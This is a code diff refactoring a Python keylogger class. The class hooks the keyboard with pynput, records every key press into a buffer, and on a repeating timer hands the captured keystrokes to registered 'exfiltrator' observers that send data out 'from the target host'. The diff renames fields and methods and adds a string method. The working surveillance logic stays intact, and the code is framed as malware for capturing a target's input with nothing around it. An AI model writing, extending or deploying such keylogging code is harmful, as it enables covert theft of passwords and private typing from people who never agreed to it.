@@ -20,7 +20,7 @@ class KeyLogger(object):
         """
 
         self.exfil_time = exfil_time
-        self.key_strokes: list[str] = ["Keylogger Initialized"]
+        self.captured_data: list[str] = ["Keylogger Initialized"]
         self.__exfiltrators = list()
 
         '''Mapping of key names to string characters for human-readable 
@@ -28,19 +28,22 @@ class KeyLogger(object):
         host and the character set it works with.'''
         self.key_mapping: dict[str: str] = {"space": " "}
 
+    def __str__(self):
+        return "".join(self.captured_data)
+
     def register_exfiltrator(self, exfiltrator) -> None:
         """Register an instance of a child-class of Exfiltrator as an
         observer, enabling output or exfiltration of captured data from
         the target host."""
         self.__exfiltrators.append(exfiltrator)
 
-    def __exfiltrate(self) -> None:
+    def _notify_all_exfiltrators(self) -> None:
         """Send captured data to each registered observer for final
         exfiltration."""
-        for exfiltrator in self.__exfiltrators:
-            exfiltrator.update(self.key_strokes)
-        Timer(interval=self.exfil_time, function=self.__exfiltrate).start()
-        self.key_strokes.clear()
+        [exfiltrator.update() for exfiltrator in self.__exfiltrators]
+        Timer(interval=self.exfil_time,
+              function=self._notify_all_exfiltrators).start()
+        self.captured_data.clear()
 
     def _on_press(self, key: keyboard.Key) -> None:
         try:
@@ -50,7 +53,7 @@ class KeyLogger(object):
                 pressed_key = self.key_mapping[key.name]
             except KeyError:  # ... or use the key's name as a result
                 pressed_key = f"[{key.name.upper()}]"
-        self.key_strokes.append(pressed_key)
+        self.captured_data.append(pressed_key)
 
     def _on_release(self, key: keyboard.Key) -> None:
         ...
@@ -59,5 +62,5 @@ class KeyLogger(object):
         with keyboard.Listener(on_press=self._on_press,
                                on_release=self._on_release) as listener:
             with contextlib.suppress(KeyboardInterrupt):
-                self.__exfiltrate()
+                self._notify_all_exfiltrators()
                 listener.join()
